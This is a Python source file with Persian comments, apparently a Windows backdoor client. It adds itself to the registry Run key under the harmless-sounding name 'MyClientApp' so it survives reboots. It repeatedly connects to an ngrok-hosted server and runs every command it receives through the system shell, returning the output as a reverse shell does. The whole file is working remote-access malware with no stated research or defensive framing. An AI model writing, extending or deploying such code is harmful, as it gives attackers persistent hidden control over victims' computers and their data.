import socket
import subprocess
import os
import time
import sys
import winreg  # برای کار با رجیستری ویندوز

# تنظیمات سرور
SERVER_IP = 'c2a4-77-77-94-87.ngrok-free.app'  # آدرس ngrok
SERVER_PORT = 80  # پورت ngrok (برای HTTP همیشه پورت 80 است)

# اضافه کردن برنامه به استارتاپ ویندوز
def add_to_startup():
    try:
        # مسیر فایل اجرایی پایتون
        python_exe_path = sys.executable
        script_path = os.path.abspath(__file__)  # مسیر اسکریپت جاری

        # ایجاد یا دسترسی به کلید رجیستری برای استارتاپ
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_value = "MyClientApp"  # نامی برای برنامه

        with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as key:
            # اضافه کردن برنامه به استارتاپ
            winreg.SetValueEx(key, reg_value, 0, winreg.REG_SZ, f'"{python_exe_path}" "{script_path}"')
            print("Program added to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")

# ایجاد اتصال به سرور
def connect_to_server():
    while True:
        try:
            # تلاش برای اتصال به سرور
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
            return client_socket
        except Exception as e:
            print(f"Error connecting to server: {e}. Retrying in 5 seconds...")
            time.sleep(5)  # منتظر 5 ثانیه قبل از تلاش مجدد

# دریافت دستور از سرور و اجرا آن
def receive_and_execute(client_socket):
    while True:
        try:
            # دریافت دستور از سرور
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                print("Exiting...")
                break
            
            # اگر دستور 'list' برای نمایش فایل‌ها باشد
            if command.lower() == 'list':
                files = os.listdir('.')
                client_socket.send(str(files).encode())
            
            # اگر دستور برای ساخت پوشه باشد
            elif command.lower().startswith("mkdir"):
                folder_name = command.split(" ", 1)[1]
                try:
                    os.makedirs(folder_name)
                    client_socket.send(f"Folder '{folder_name}' created.".encode())
                except Exception as e:
                    client_socket.send(f"Error creating folder: {e}".encode())
            
            # اگر دستور برای تغییر دایرکتوری باشد
            elif command.lower().startswith("cd"):
                try:
                    directory = command.split(" ", 1)[1]
                    os.chdir(directory)
                    client_socket.send(f"Changed directory to {directory}".encode())
                except FileNotFoundError:
                    client_socket.send(f"Directory '{directory}' not found.".encode())
                except Exception as e:
                    client_socket.send(f"Error changing directory: {e}".encode())
            
            # اجرای هر دستور shell دیگر
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client_socket.send(output)
                except subprocess.CalledProcessError as e:
                    client_socket.send(f"Error executing command: {e}".encode())
        except Exception as e:
            print(f"Error while receiving/executing command: {e}")
            break

# برنامه اصلی
if __name__ == "__main__":
    add_to_startup()  # اضافه کردن برنامه به استارتاپ ویندوز

    client_socket = connect_to_server()  # تلاش برای اتصال به سرور
    if client_socket:
        receive_and_execute(client_socket)
        client_socket.close()
